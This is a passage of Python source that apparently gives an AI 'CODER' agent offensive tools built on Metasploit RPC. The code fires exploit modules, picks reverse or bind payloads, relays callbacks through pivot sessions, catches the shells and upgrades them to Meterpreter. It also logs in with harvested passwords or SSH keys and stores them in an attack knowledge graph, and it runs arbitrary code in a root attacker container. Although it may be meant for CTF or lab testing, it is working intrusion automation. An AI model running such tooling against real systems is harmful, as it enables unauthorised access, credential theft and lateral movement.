                _os_h  = (extra_options or {}).get("_target_os", "")
                _arch_h = (extra_options or {}).get("_target_arch", "")
                _ranked_mh = _smart_select_payload(
                    _compat_mh, module_path,
                    target_os=_os_h, target_arch=_arch_h,
                    hop_count=hop_count,
                )
                _auto_bind = _ranked_mh.get("suggested_payload", "")
                if _auto_bind:
                    payload = _auto_bind

        if not lhost_to_use:
            # Multi-hop with a reverse payload:
            # set up portfwd on the nearest pivot Meterpreter session so the reverse
            # callback is relayed through the existing tunnel chain automatically.
            if hop_count >= 2 and payload and "bind" not in payload.lower():
                _pf = _setup_portfwd_chain_internal(
                    target_ip=first_host,
                    forward_to_port=int(_lport),
                )
                if _pf and _pf.get("lhost"):
                    lhost_to_use = _pf["lhost"]
                    print(f"[msf_trigger_exploit] Multi-hop pivot: reverse payload will call back to pivot IP {lhost_to_use}:{_lport}")
                else:
                    # portfwd unavailable — fall back gracefully
                    print(f"[msf_trigger_exploit] Warning: portfwd relay setup failed or returned None. Falling back to local LHOST.")
                    lhost_to_use = _resolve_docker_lhost(first_host) or ATTACKER_LHOST
            else:
                docker_ip = _resolve_docker_lhost(first_host)
                if docker_ip:
                    lhost_to_use = docker_ip
                else:
                    try:
                        # Resolve the local interface IP that routes to target
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        try:
                            target_routing_ip = socket.gethostbyname(first_host)
                        except Exception:
                            target_routing_ip = first_host
                        s.connect((target_routing_ip, rport))
                        resolved_ip = s.getsockname()[0]
                        s.close()
                        if resolved_ip and resolved_ip != "127.0.0.1":
                            lhost_to_use = resolved_ip
                        else:
                            lhost_to_use = ATTACKER_LHOST
                    except Exception:
                        lhost_to_use = ATTACKER_LHOST

        options = {
            "RHOSTS": rhosts,
            "RPORT": str(rport),
            "LHOST": lhost_to_use,
            "LPORT": _lport,
            "ReverseListenerBindAddress": "0.0.0.0"
        }
        if payload and payload.strip():
            options["PAYLOAD"] = payload.strip()

        options.update(resolved_params)

        # Merge caller-supplied options (e.g. TARGETURI, HTTP_METHOD) — overrides all defaults above
        if extra_options:
            options.update({k: str(v) for k, v in extra_options.items() if not k.startswith("_")})

        # GeoServer module quirk: the Metasploit Ruby module hardcodes 'geoserver' in normalize_uri (lines 99, 117, 171).
        # Passing TARGETURI='/geoserver/' causes duplicate '/geoserver/geoserver/' -> 404. Normalize to '/'.
        if "geoserver" in module_path.lower():
            if str(options.get("TARGETURI", "")).rstrip("/") == "/geoserver":
                options["TARGETURI"] = "/"

        # Check payload compatibility via Metasploit RPC before triggering if payload was explicitly provided
        if payload and payload.strip():
            compat_payloads = _get_effective_compat_payloads(module_path)
            if compat_payloads and payload.strip() not in compat_payloads:
                # Pull banner and OS context from extra_options if the caller set them
                _banner = (extra_options or {}).get("_banner", "")
                _os     = (extra_options or {}).get("_target_os", "")
                _arch   = (extra_options or {}).get("_target_arch", "")
                ranked  = _smart_select_payload(compat_payloads, module_path,
                                                banner=_banner, target_os=_os, target_arch=_arch)
                return json.dumps({
                    "status": "failed",
                    "used_lhost": lhost_to_use,
                    "stderr": f"Payload '{payload}' is not compatible with module '{module_path}'.",
                    "suggested_payload": ranked["suggested_payload"],
                    "top_candidates": ranked["top_candidates"],
                    "bind_candidates": ranked.get("bind_candidates", []),
                    "guidance": ranked.get("guidance", ""),
                    "scoring_hints": ranked.get("scoring_hints", {}),
                    "hint": (
                        f"Payload '{payload}' is incompatible with module '{module_path.split('/')[-1]}'. "
                        f"Recommended reverse payloads: {ranked['top_candidates'][:3]}. "
                        f"Bind alternatives (if target cannot reach LHOST): {ranked.get('bind_candidates', [])[:3]}."
                    )
                })
        
        # 1. Memorize active sessions before running the exploit
        try:
            pre_sessions_res = msf_client.call("session.list")
            pre_sessions = pre_sessions_res if isinstance(pre_sessions_res, dict) else {}
            pre_sessions.pop("error", None)
        except Exception:
            pre_sessions = {}

        exec_res = msf_client.call("module.execute", "exploit", module_path, options)
        if "error" in exec_res:
            err_msg = exec_res["error"]
            if isinstance(err_msg, bool):
                err_msg = f"Metasploit RPC rejected exploit module '{module_path}' (error: {err_msg}). Verify options and module name."
            return json.dumps({"status": "error", "message": str(err_msg)})
            
        # 2. Job-aware polling: wait for MSF to declare the exploit job finished.
        #
        # Strategy (no per-module hardcoding):
        #   - Poll session.list every 0.5s; exit immediately on new session.
        #   - Simultaneously track job.list: when the job disappears MSF considers
        #     the exploit done. After job completion we allow a short grace window
        #     (3 s) for the session to appear in session.list, then give up.
        #   - Hard safety cap of 300 s catches zombie jobs that never exit.
        new_sessions = {}
        elapsed = 0.0
        max_wait = 300.0   # absolute zombie-guard; MSF will finish the job long before this
        job_id = exec_res.get("job_id")
        job_finished_at: float | None = None
        GRACE_AFTER_JOB = 60.0  # after job ends, keep polling up to 60s for the session callback

        while elapsed < max_wait:
            step = 0.2 if elapsed < 2.0 else 0.5
            time.sleep(step)
            elapsed += step

            # Check for new sessions first (fast path)
            sessions_res = msf_client.call("session.list")
            sessions = sessions_res if isinstance(sessions_res, dict) else {}
            sessions.pop("error", None)
            new_sessions = {sid: info for sid, info in sessions.items() if sid not in pre_sessions}
            if new_sessions:
                time.sleep(0.5)  # let session info settle
                sessions_res = msf_client.call("session.list")
                sessions = sessions_res if isinstance(sessions_res, dict) else {}
                sessions.pop("error", None)
                new_sessions = {sid: info for sid, info in sessions.items() if sid not in pre_sessions}
                break

            # Check if the MSF job has finished (job disappears from job.list)
            if job_id is not None and job_finished_at is None:
                try:
                    jobs_res = msf_client.call("job.list")
                    running_jobs = jobs_res if isinstance(jobs_res, dict) else {}
                    if str(job_id) not in running_jobs:
                        job_finished_at = elapsed
                except Exception:
                    pass

            # Once the job is done, give GRACE_AFTER_JOB seconds then stop
            if job_finished_at is not None and (elapsed - job_finished_at) >= GRACE_AFTER_JOB:
                break



        matching_sessions = {}
        for sid, info in new_sessions.items():
            session_ips = _get_session_ips(info)
            resolved_session_ips = set()
            for ip in session_ips:
                resolved_session_ips.add(ip)
                try:
                    resolved_ip = socket.gethostbyname(ip)
                    resolved_session_ips.add(resolved_ip)
                except Exception:
                    pass
            
            is_match = False
            for ip_str in resolved_session_ips:
                if _is_ip_match(ip_str, target_ips, target_networks, target_hostnames, has_loopback_target):
                    is_match = True
                    break
            
            # Loopback target lenience: accept private or loopback session IPs
            if not is_match and has_loopback_target:
                for ip_str in resolved_session_ips:
                    try:
                        ip = ipaddress.ip_address(ip_str)
                        if ip.is_loopback or ip.is_private:
                            is_match = True
                            break
                    except Exception:
                        pass

            # Exploit module fallback verification (ONLY for newly opened sessions)
            if not is_match:
                via_exploit = info.get("via_exploit", "")
                expected_exploit = module_path.split("/")[-1].lower()
                if via_exploit and expected_exploit in str(via_exploit).lower():
                    has_private_target = any(ip.is_private or ip.is_loopback for ip in target_ips) or not target_ips
                    if has_private_target:
                        for ip_str in resolved_session_ips:
                            try:
                                ip = ipaddress.ip_address(ip_str)
                                if ip.is_loopback or ip.is_private:
                                    is_match = True
                                    break
                            except Exception:
                                pass

            if is_match:
                matching_sessions[sid] = info

        # 4. If no new session matches the host, report exploit failure
        if matching_sessions:
            # Select the newest active session ID
            active_id = max(matching_sessions.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else -1)[0]

            # cmd/unix/interact sessions are ephemeral by design: the shell on the
            # target (e.g. vsftpd backdoor port 6200) closes if not immediately used.
            # Presence in session.list is sufficient proof — skip the liveness probe
            # to avoid killing the session with the delay it introduces.
            via_payload = matching_sessions[active_id].get("via_payload", "")
            is_interact_payload = "interact" in str(via_payload).lower()

            # Liveness check: session is already confirmed in session.list above — skip shell_read probe.
            # _verify_session_alive removed: shell_read freezes msfrpcd on JSP/raw shells.

            # Auto-upgrade raw shell sessions to Meterpreter and record in AKG
            # DISABLED: race condition — close_original_shell=True destroys the shell session before
            # session.list can confirm the new meterpreter session ID, causing the returned
            # session_id to point to a dead session. Re-enable once the race is fixed.
            upgrade_note = None
            _AUTO_UPGRADE_ENABLED = False  # set to True to re-enable
            sess_type = matching_sessions[active_id].get("type", "shell")
            if _AUTO_UPGRADE_ENABLED and sess_type == "shell":
                try:
                    from core.postexploit_tools import msf_upgrade_shell_to_meterpreter
                    upg_res_str = msf_upgrade_shell_to_meterpreter(
                        session_id=active_id,
                        lhost=None,
                        timeout=30,
                        close_original_shell=True
                    )
                    upg_res = json.loads(upg_res_str)
                    if upg_res.get("status") == "success":
                        new_meterp_id = str(upg_res.get("session_id"))
                        raw_sess_res = msf_client.call("session.list")
                        sess_res = {str(k): v for k, v in raw_sess_res.items()} if isinstance(raw_sess_res, dict) and "error" not in raw_sess_res else {}
                        if new_meterp_id in sess_res:
                            active_id = new_meterp_id
                            matching_sessions[active_id] = sess_res[new_meterp_id]
                        else:
                            active_id = new_meterp_id
                            matching_sessions[active_id] = {"type": "meterpreter", "id": active_id}
                        upgrade_note = f"Successfully upgraded shell to Meterpreter session {active_id}."
                    else:
                        upgrade_note = f"Meterpreter upgrade notice: {upg_res.get('message', 'Timed out. Original shell session remains active.')}"
                except Exception as e:
                    upgrade_note = f"Meterpreter upgrade exception: {str(e)}. Original shell session remains active."

            # Auto-record ExploitStep in AKG on success
            try:
                from core.akg_tools import akg_record_exploit
                sess_info = matching_sessions[active_id]
                sess_user = sess_info.get("user") or sess_info.get("info", "").split("@")[0].strip() or "unknown"
                via_payload_str = str(sess_info.get("via_payload", "")).replace("payload/", "").strip()
                actual_payload = payload.strip() if (payload and payload.strip()) else via_payload_str
                via_exp = str(sess_info.get("via_exploit", "")).strip()
                if via_exp and "handler" not in via_exp.lower():
                    actual_module = via_exp
                else:
                    actual_module = module_path
                akg_record_exploit(
                    session_id=int(active_id),
                    host_ip=rhosts,
                    port=rport,
                    exploit_module=actual_module,
                    payload=actual_payload,
                    user=sess_user,
                    lhost=lhost_to_use,
                    session_type=sess_type,
                    extra_properties=extra_options,
                )
            except Exception:
                pass

            ret_payload = {
                "status": "success",
                "session_id": active_id,
                "session_details": matching_sessions[active_id],
                "used_lhost": lhost_to_use
            }
            if upgrade_note:
                ret_payload["upgrade_message"] = upgrade_note

            return json.dumps(ret_payload)
        else:
            # Fall back to checking all post sessions if no new matching session was found
            try:
                post_sessions_res = msf_client.call("session.list")
                post_sessions = post_sessions_res if isinstance(post_sessions_res, dict) else {}
                post_sessions.pop("error", None)
            except Exception:
                post_sessions = {}

            matching_sessions = {}
            for sid, info in post_sessions.items():
                session_ips = _get_session_ips(info)
                resolved_session_ips = set()
                for ip in session_ips:
                    resolved_session_ips.add(ip)
                    try:
                        resolved_ip = socket.gethostbyname(ip)
                        resolved_session_ips.add(resolved_ip)
                    except Exception:
                        pass
                
                is_match = False
                for ip_str in resolved_session_ips:
                    if _is_ip_match(ip_str, target_ips, target_networks, target_hostnames, has_loopback_target):
                        is_match = True
                        break
                
                # Loopback target lenience: accept private or loopback session IPs
                if not is_match and has_loopback_target:
                    for ip_str in resolved_session_ips:
                        try:
                            ip = ipaddress.ip_address(ip_str)
                            if ip.is_loopback or ip.is_private:
                                is_match = True
                                break
                        except Exception:
                            pass

                if is_match:
                    matching_sessions[sid] = info

            if matching_sessions:
                active_id = max(matching_sessions.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else -1)[0]

                # Same interact-payload bypass as above (fallback branch)
                via_payload = matching_sessions[active_id].get("via_payload", "")
                is_interact_payload = "interact" in str(via_payload).lower()

                # Liveness check: session presence in session.list is sufficient — skip shell_read probe.
                # _verify_session_alive removed: shell_read freezes msfrpcd on JSP/raw shells.

                upgrade_note = None
                sess_type = matching_sessions[active_id].get("type", "shell")
                if sess_type == "shell":
                    try:
                        from core.postexploit_tools import msf_upgrade_shell_to_meterpreter
                        upg_res_str = msf_upgrade_shell_to_meterpreter(
                            session_id=active_id,
                            lhost=None,
                            timeout=30,
                            close_original_shell=True
                        )
                        upg_res = json.loads(upg_res_str)
                        if upg_res.get("status") == "success":
                            new_meterp_id = str(upg_res.get("session_id"))
                            raw_sess_res = msf_client.call("session.list")
                            sess_res = {str(k): v for k, v in raw_sess_res.items()} if isinstance(raw_sess_res, dict) and "error" not in raw_sess_res else {}
                            if new_meterp_id in sess_res:
                                active_id = new_meterp_id
                                matching_sessions[active_id] = sess_res[new_meterp_id]
                            else:
                                active_id = new_meterp_id
                                matching_sessions[active_id] = {"type": "meterpreter", "id": active_id}
                            upgrade_note = f"Successfully upgraded shell to Meterpreter session {active_id}."
                        else:
                            upgrade_note = f"Meterpreter upgrade notice: {upg_res.get('message', 'Timed out. Original shell session remains active.')}"
                    except Exception as e:
                        upgrade_note = f"Meterpreter upgrade exception: {str(e)}. Original shell session remains active."

                try:
                    from core.akg_tools import akg_record_exploit
                    sess_info = matching_sessions[active_id]
                    sess_user = sess_info.get("user") or sess_info.get("info", "").split("@")[0].strip() or "unknown"
                    sess_type = sess_info.get("type", "meterpreter")
                    via_payload_str = str(sess_info.get("via_payload", "")).replace("payload/", "").strip()
                    actual_payload = payload.strip() if (payload and payload.strip()) else via_payload_str
                    via_exp = str(sess_info.get("via_exploit", "")).strip()
                    if via_exp and "handler" not in via_exp.lower():
                        actual_module = via_exp
                    else:
                        actual_module = module_path
                    akg_record_exploit(
                        session_id=int(active_id),
                        host_ip=rhosts,
                        port=rport,
                        exploit_module=actual_module,
                        payload=actual_payload,
                        user=sess_user,
                        lhost=lhost_to_use,
                        session_type=sess_type,
                        extra_properties=extra_options,
                    )
                except Exception:
                    pass

                ret_payload = {
                    "status": "success",
                    "session_id": active_id,
                    "session_details": matching_sessions[active_id],
                    "used_lhost": lhost_to_use
                }
                if upgrade_note:
                    ret_payload["upgrade_message"] = upgrade_note

                return json.dumps(ret_payload)
            
            suggested_payload_out = ""
            top_candidates_out    = []
            bind_candidates_out   = []
            guidance_out          = ""
            scoring_hints_out     = {}
            hint_msg              = "Exploit triggered but no active session was returned."

            if not compat_payloads:
                compat_payloads = _get_effective_compat_payloads(module_path)

            if compat_payloads:
                _banner = (extra_options or {}).get("_banner", "")
                _os     = (extra_options or {}).get("_target_os", "")
                _arch   = (extra_options or {}).get("_target_arch", "")
                ranked  = _smart_select_payload(compat_payloads, module_path,
                                                banner=_banner, target_os=_os, target_arch=_arch)
                suggested_payload_out = ranked["suggested_payload"]
                top_candidates_out    = ranked["top_candidates"]
                bind_candidates_out   = ranked.get("bind_candidates", [])
                guidance_out          = ranked.get("guidance", "")
                scoring_hints_out     = ranked.get("scoring_hints", {})

                bind_note = (
                    f" 2) If the target is behind a pivot/isolated subnet unable to reach LHOST ({lhost_to_use}), "
                    f"retry using a bind payload from bind_candidates: {bind_candidates_out[:3]}."
                ) if bind_candidates_out else ""

                same_payload = (payload == suggested_payload_out)
                if same_payload:
                    hint_msg = (
                        f"Payload '{payload}' is optimal for reverse connection but no session was established. "
                        f"Verify LHOST ({lhost_to_use}) is reachable from the target. "
                        f"Alternative reverse payloads: {top_candidates_out[1:3]}."
                        f"{bind_note}"
                    )
                else:
                    hint_msg = (
                        f"Payload '{payload or '(default)'}' triggered but no session was established. "
                        f"1) For direct/perimeter targets, retry with suggested_payload: '{suggested_payload_out}' or top_candidates: {top_candidates_out[:3]}."
                        f"{bind_note}"
                    )
            # If this is a web/HTTP module, append TARGETURI diagnostic hint
            is_http = any(tok in module_path.lower() for tok in ["http", "web", "struts", "drupal", "wordpress", "wp_", "tomcat", "cgi", "geoserver"])
            uri_used = options.get("TARGETURI") or options.get("URI") or options.get("PATH")
            if is_http:
                try:
                    svc_props = _get_akg_service_properties(first_host, rport)
                    discovered = svc_props.get("discovered_paths", [])
                    web_path_akg = svc_props.get("web_path", "")
                    hint_msg += (
                        f" | TARGETURI NOTICE: Exploited URI was '{uri_used or '/'}'. "
                        f"If the web application is mounted at a context subpath, ensure extra_options={{'TARGETURI': '<base_path>'}} "
                        f"(e.g. '{web_path_akg}' or base context). Discovered paths in AKG: {discovered[:3]}. "
                        f"Avoid deep subpages (e.g. do not use '/web/' or '/index.html')."
                    )
                except Exception:
                    pass

            return json.dumps({
                "status": "failed",
                "used_lhost": lhost_to_use,
                "stderr": "Exploit triggered but no active session was returned.",
                "suggested_payload": suggested_payload_out,
                "top_candidates": top_candidates_out,
                "bind_candidates": bind_candidates_out,
                "guidance": guidance_out,
                "scoring_hints": scoring_hints_out,
                "hint": hint_msg
            })

    except Exception as e:
        return json.dumps({"status": "error", "message": str(e)})


def get_lhost_for_target(target_ip: str) -> str:
    """
    Network diagnostic tool for the CODER agent.
    Resolves the best local IP address (LHOST) to use as the reverse-shell callback
    for a specific target IP. Falls back to the configured ATTACKER_LHOST if routing
    resolution fails.

    Args:
        target_ip: The target IP address the reverse shell must call back to
                   (e.g., "172.17.0.4" for a Docker container).

    Returns a JSON object with:
        - lhost: the recommended LHOST value to pass to msf_trigger_exploit
        - lport: the configured LPORT
        - source: how the IP was determined ("routing" | "fallback")
    """
    try:
        docker_ip = _resolve_docker_lhost(target_ip)
        if docker_ip:
            return json.dumps({
                "status": "success",
                "lhost": docker_ip,
                "lport": ATTACKER_LPORT,
                "source": "docker-routing"
            })

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target_ip, 80))
            resolved_ip = s.getsockname()[0]
        except Exception:
            resolved_ip = None
        finally:
            s.close()

        if resolved_ip and resolved_ip != "127.0.0.1":
            return json.dumps({
                "status": "success",
                "lhost": resolved_ip,
                "lport": ATTACKER_LPORT,
                "source": "routing"
            })
        else:
            return json.dumps({
                "status": "success",
                "lhost": ATTACKER_LHOST,
                "lport": ATTACKER_LPORT,
                "source": "fallback"
            })
    except Exception as e:
        return json.dumps({"status": "error", "message": str(e)})


def msf_login(
    target: str,
    port: Union[int, str] = 22,
    username: str = "",
    password: str = "",
    service: str = "ssh",
    ssh_key: str = "",
) -> str:
    """
    Direct authentication & credential login tool for the CODER agent.
    Logs into a target service using provided or discovered credentials (SSH, FTP, Telnet, SMB, MySQL, Postgres)
    via Metasploit login modules. Supports both password authentication and SSH private key authentication (via ssh_key).
    If ssh_key is omitted for SSH, automatically checks the Attack Knowledge Graph (AKG) for any harvested SSH private keys.
    If successful, automatically captures the opened interactive session ID
    and records the exploit step and credentials in the Attack Knowledge Graph (AKG).

    Args:
        target: Target IP address (e.g. "192.168.1.10" or "10.10.1.3").
        port: Target service port (default: 22 for SSH, 21 for FTP, 23 for Telnet, 445 for SMB).
        username: Username to authenticate with (e.g. "student", "root", "admin").
        password: Password to authenticate with (e.g. "password", "toor").
        service: Protocol / service type ("ssh", "ftp", "telnet", "smb", "mysql", "postgres"). Default is "ssh".
        ssh_key: Optional SSH private key content (OpenSSH/RSA PEM) or local path to private key file.

    Returns:
        JSON string containing status, session_id (if a shell was spawned), and authentication outcome.
    """
    service_map = {
        "ssh": ("auxiliary/scanner/ssh/ssh_login", 22),
        "ftp": ("auxiliary/scanner/ftp/ftp_login", 21),
        "telnet": ("auxiliary/scanner/telnet/telnet_login", 23),
        "smb": ("auxiliary/scanner/smb/smb_login", 445),
        "mysql": ("auxiliary/scanner/mysql/mysql_login", 3306),
        "postgres": ("auxiliary/scanner/postgres/postgres_login", 5432),
    }

    srv_key = str(service).lower().strip()
    module_path, default_port = service_map.get(srv_key, (f"auxiliary/scanner/{srv_key}/{srv_key}_login", 22))
    
    rport = int(port) if str(port).isdigit() else default_port

    # Auto-resolve SSH key from AKG if not explicitly provided
    if srv_key == "ssh" and not ssh_key and not password:
        try:
            from core.akg_tools import _g
            g = _g()
            for n in g._nodes.values():
                if n.type == "Credential" and n.properties.get("cred_type") == "ssh_key":
                    candidate = n.properties.get("secret", "")
                    if candidate and "-----BEGIN" in candidate:
                        ssh_key = candidate
                        if not username:
                            username = n.properties.get("username", "root")
                        break
        except Exception:
            pass

    # If ssh_key is provided or resolved, transfer it to msf-rpc container
    remote_key_path = None
    if srv_key == "ssh" and ssh_key:
        import subprocess, uuid
        key_content = ssh_key.strip()
        if not key_content.startswith("-----BEGIN") and os.path.exists(key_content):
            try:
                with open(key_content, "r") as kf:
                    key_content = kf.read().strip()
            except Exception:
                pass

        if "-----BEGIN" in key_content:
            key_id = uuid.uuid4().hex[:8]
            remote_key_path = f"/tmp/msf_ssh_key_{key_id}"
            try:
                subprocess.run(
                    ["docker", "exec", "-i", "msf-rpc", "sh", "-c", f"cat > {remote_key_path} && chmod 600 {remote_key_path}"],
                    input=key_content + "\n",
                    text=True,
                    timeout=5,
                    check=True
                )
                module_path = "auxiliary/scanner/ssh/ssh_login_pubkey"
            except Exception as e:
                return json.dumps({
                    "status": "error",
                    "message": f"Failed to transfer SSH private key to Metasploit container: {str(e)}"
                })

    try:
        # Snapshot existing sessions before login
        initial_sessions = {}
        try:
            slist = msf_client.call("session.list")
            if isinstance(slist, dict):
                initial_sessions = slist
        except Exception:
            pass

        # Create dedicated console for clean execution
        console_res = msf_client.call("console.create")
        if not isinstance(console_res, dict) or "id" not in console_res:
            return json.dumps({"status": "error", "message": "Failed to create Metasploit console for login."})
        cid = str(console_res["id"])

        try:
            lines = [
                f"use {module_path}",
                f"set RHOSTS {target}",
                f"set RPORT {rport}",
            ]
            if username:
                lines.append(f"set USERNAME {username}")

            if remote_key_path:
                lines.append(f"set KEY_PATH {remote_key_path}")
                lines.append("set CreateSession true")
            elif password:
                lines.append(f"set PASSWORD {password}")

            lines.extend([
                "set STOP_ON_SUCCESS true",
                "run"
            ])
            cmd = "\n".join(lines) + "\n"
            msf_client.call("console.write", cid, cmd)

            # Poll console until completed
            timeout = 30
            start_time = time.time()
            full_output = ""
            while True:
                time.sleep(1)
                res = msf_client.call("console.read", cid)
                if isinstance(res, dict):
                    chunk = res.get("data", "")
                    if chunk:
                        full_output += chunk
                    busy = res.get("busy", False)
                    if not busy and ("Auxiliary module execution completed" in full_output or "Scanned" in full_output):
                        break
                if time.time() - start_time > timeout:
                    break
        finally:
            try:
                msf_client.call("console.destroy", cid)
            except Exception:
                pass
            if remote_key_path:
                try:
                    subprocess.run(
                        ["docker", "exec", "msf-rpc", "rm", "-f", remote_key_path],
                        timeout=5
                    )
                except Exception:
                    pass

        # Check for newly created session
        time.sleep(1)
        new_sessions = {}
        try:
            slist = msf_client.call("session.list")
            if isinstance(slist, dict):
                new_sessions = slist
        except Exception:
            pass

        new_session_id = None
        for sid, sinfo in new_sessions.items():
            if sid not in initial_sessions:
                new_session_id = sid
                break

        # Check for positive authentication in output
        auth_success = (
            "[+]" in full_output or
            "Success:" in full_output or
            "Command shell session" in full_output or
            "Meterpreter session" in full_output or
            new_session_id is not None
        )

        if new_session_id:
            # Record in AKG
            try:
                from core.akg_tools import akg_record_exploit, akg_add_credential
                sess_info = new_sessions.get(new_session_id, {})
                sess_user = username or sess_info.get("user") or "unknown"
                sess_type = sess_info.get("type", "shell")
                akg_record_exploit(
                    session_id=int(new_session_id),
                    host_ip=target,
                    port=rport,
                    exploit_module=module_path,
                    payload=f"login/{srv_key}",
                    user=sess_user,
                    session_type=sess_type,
                    extra_properties={"username": username, "auth": "ssh_key" if remote_key_path else "password"}
                )
                akg_add_credential(
                    exploit_session_id=int(new_session_id),
                    cred_type="ssh_key" if remote_key_path else "plaintext",
                    label=f"{srv_key.upper()} Access ({sess_user}@{target})",
                    location=f"{target}:{rport}",
                    username=username,
                    secret=ssh_key if remote_key_path else password
                )
            except Exception:
                pass

            return json.dumps({
                "status": "success",
                "session_id": str(new_session_id),
                "service": srv_key,
                "target": target,
                "port": rport,
                "username": username,
                "info": f"Authentication succeeded! Interactive session {new_session_id} established.",
                "console_output": full_output
            })
        elif auth_success:
            # Valid credential verified (e.g. database or service without pty)
            try:
                from core.akg_tools import akg_add_credential
                akg_add_credential(
                    session_id="",
                    cred_type="plaintext",
                    label=f"{srv_key.upper()} Verified Credentials",
                    location=f"{target}:{rport}",
                    user=username,
                    secret=password
                )
            except Exception:
                pass

            return json.dumps({
                "status": "success",
                "service": srv_key,
                "target": target,
                "port": rport,
                "username": username,
                "info": "Authentication verified successfully with valid credentials.",
                "console_output": full_output
            })
        else:
            return json.dumps({
                "status": "failed",
                "service": srv_key,
                "target": target,
                "port": rport,
                "username": username,
                "message": "Authentication failed with the provided credentials.",
                "console_output": full_output
            })

    except Exception as e:
        return json.dumps({"status": "error", "message": str(e)})


def execute_python_code(code: str, timeout: int = 30) -> str:
    """
    Local code execution and data processing tool for the CODER agent.
    Executes a Python script/snippet locally in the attacker environment.

    Use this tool for:
    - Cryptographic computations (e.g. XOR key-reuse attacks, RSA math, small key brute force, hashing).
    - Custom data decoding/encoding (e.g. custom base64/hex transforms, payload generation, token manipulation).
    - Network sniffing and CTF / Web challenge calculations (e.g. raw socket sniffing, custom HTTP payloads).
    - Interacting with custom endpoints or parsing complex leaked source code.

    Args:
        code: Python script/snippet to execute.
        timeout: Execution timeout in seconds (default 30).
    """
    import subprocess
    import sys
    import json
    from core.utils import get_attacker_container

    try:
        res = subprocess.run(
            [sys.executable, "-c", code],
            capture_output=True,
            text=True,
            timeout=timeout
        )

        # Transparent privileged fallback: if the local runtime lacks raw-socket
        # capabilities (CAP_NET_RAW), re-execute inside the attacker container which
        # runs as root. The container is discovered generically — no hardcoded names.
        if res.returncode != 0 and (
            "PermissionError" in res.stderr or "Operation not permitted" in res.stderr
        ):
            runner = get_attacker_container()
            if runner:
                res = subprocess.run(
                    ["docker", "exec", runner, "python3", "-c", code],
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )

        return json.dumps({
            "status": "success" if res.returncode == 0 else "error",
            "stdout": res.stdout.strip(),
            "stderr": res.stderr.strip(),
            "returncode": res.returncode
        })
    except subprocess.TimeoutExpired:
        return json.dumps({"status": "error", "message": f"Execution timed out after {timeout} seconds."})
    except Exception as e:
        return json.dumps({"status": "error", "message": str(e)})


def get_network_environment() -> str:
    """
    Network environment inspection tool for the CODER agent.
    Returns the network interfaces (name, MAC) and the active ARP cache table
    from the attacker execution environment.

    Use this tool before writing custom network scripts in execute_python_code
    (e.g. ARP spoofing, packet sniffing, MITM, raw socket manipulation) to discover
    the exact interface name (e.g. 'eth0'), attacker MAC, and target host MAC addresses.
    """
    import subprocess
    import sys
    import json
    from core.utils import get_attacker_container

    runner = get_attacker_container()

    script = """
import json, os

interfaces = []
for iface in sorted(os.listdir('/sys/class/net')):
    if iface == 'lo':
        continue
    mac = ""
    try:
        with open(f'/sys/class/net/{iface}/address') as f:
            mac = f.read().strip()
    except Exception:
        pass
    interfaces.append({"name": iface, "mac": mac})

arp_cache = []
try:
    with open('/proc/net/arp') as f:
        for line in f.read().splitlines()[1:]:
            parts = line.split()
            if len(parts) >= 4 and parts[2] == '0x2' and parts[3] != '00:00:00:00:00:00':
                arp_cache.append({"ip": parts[0], "mac": parts[3], "device": parts[5] if len(parts) > 5 else ""})
except Exception:
    pass

print(json.dumps({"interfaces": interfaces, "arp_cache": arp_cache}))
"""
    try:
        if runner:
            res = subprocess.run(
                ["docker", "exec", runner, "python3", "-c", script],
                capture_output=True, text=True, timeout=5
            )
        else:
            res = subprocess.run(
                [sys.executable, "-c", script],
                capture_output=True, text=True, timeout=5
            )

        if res.returncode == 0 and res.stdout.strip():
            data = json.loads(res.stdout.strip())
            data["status"] = "success"
            data["runner"] = runner or "local_host"
            return json.dumps(data)
    except Exception as e:
        return json.dumps({"status": "error", "message": str(e)})

    return json.dumps({"status": "error", "message": "Failed to inspect network environment."})



